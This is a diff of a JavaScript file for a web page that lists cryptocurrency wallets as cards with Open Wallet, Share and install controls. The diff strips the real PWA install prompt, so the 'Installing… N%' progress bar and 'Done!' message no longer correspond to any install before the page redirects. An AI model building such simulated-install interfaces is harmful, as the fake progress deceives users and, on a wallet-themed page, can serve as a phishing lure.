@@ -15,7 +15,7 @@ const wallets = [
 
 const container = document.getElementById("walletContainer");
 
-// Generate wallet cards
+// Generate cards
 wallets.forEach((name) => {
   let imageName =
     name.toLowerCase()
@@ -25,6 +25,7 @@ wallets.forEach((name) => {
       .replace(/-/g, "")
       .replace(/\//g, "") + ".webp";
 
+  // "Other Wallets" special card
   if (name.toLowerCase().includes("other")) {
     container.innerHTML += `
       <div class="wallet-card">
@@ -42,6 +43,7 @@ wallets.forEach((name) => {
               <span>Open Wallet</span>
           </div>
 
+          <!-- ⭐ New Share button -->
           <div class="icon-btn share-btn" onclick="shareWallet('${name}')">
               <img src="assets/icons/share.png">
               <span>Share</span>
@@ -53,6 +55,7 @@ wallets.forEach((name) => {
     return;
   }
 
+  // Normal wallet card
   container.innerHTML += `
     <div class="wallet-card">
       <img src="wallet-icons/${imageName}" alt="${name}">
@@ -70,6 +73,7 @@ wallets.forEach((name) => {
             <span>Open Wallet</span>
         </div>
 
+        <!-- ⭐ New Share button -->
         <div class="icon-btn share-btn" onclick="shareWallet('${name}')">
             <img src="assets/icons/share.png">
             <span>Share</span>
@@ -80,31 +84,32 @@ wallets.forEach((name) => {
   `;
 });
 
-// ------------------------------
-// Open Wallet Page
-// ------------------------------
+// Open wallet page
 function openWallet(walletName) {
   window.location.href = `wallet-page.html?wallet=${walletName}`;
 }
 
-// ------------------------------
-// Share Wallet
-// ------------------------------
+/* ---------------------------
+   SHARE WALLET FUNCTION
+----------------------------- */
+
 function shareWallet(walletName) {
   if (navigator.share) {
     navigator.share({
       title: "Wallet",
       text: `Check this wallet: ${walletName}`,
       url: window.location.href
-    }).catch((err) => console.log("Share cancelled", err));
+    })
+    .catch((err) => console.log("Share cancelled", err));
   } else {
     alert("Sharing is not supported on this device.");
   }
 }
 
-// ------------------------------
-// PWA INSTALL LOGIC
-// ------------------------------
+/* ---------------------------
+   PWA INSTALL + POPUP LOGIC
+----------------------------- */
+
 let deferredPrompt = null;
 
 window.addEventListener("beforeinstallprompt", (e) => {
@@ -116,7 +121,7 @@ function closePopup() {
   document.getElementById("pwaPopup").style.display = "none";
 }
 
-// Main Install Function (Progress + Real Install)
+// MOBILE ONLY INSTALL
 function installWallet(walletName) {
 
   if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
@@ -130,7 +135,7 @@ function installWallet(walletName) {
   document.getElementById("progressText").innerText = "Installing… 0%";
   document.getElementById("progressFill").style.width = "0%";
 
-  let interval = setInterval(async () => {
+  let interval = setInterval(() => {
     progress++;
     document.getElementById("progressText").innerText = `Installing… ${progress}%`;
     document.getElementById("progressFill").style.width = progress + "%";
@@ -141,32 +146,14 @@ function installWallet(walletName) {
       document.getElementById("progressText").innerText = "Done!";
       document.getElementById("progressFill").style.width = "100%";
 
-      setTimeout(async () => {
-
-        // 🔥 REAL INSTALL DIALOG (IMPORTANT)
-        if (deferredPrompt) {
-          deferredPrompt.prompt();
-
-          let choice = await deferredPrompt.userChoice;
-
-          if (choice.outcome === "accepted") {
-            console.log("User installed app");
-          } else {
-            console.log("User dismissed install");
-          }
-
-          deferredPrompt = null;
-        }
-
+      setTimeout(() => {
         closePopup();
         openWallet(walletName);
-
       }, 700);
     }
   }, 40);
 }
 
-// Install Button (if used separately)
 document.getElementById("installBtn").onclick = async () => {
   if (deferredPrompt) {
     deferredPrompt.prompt();
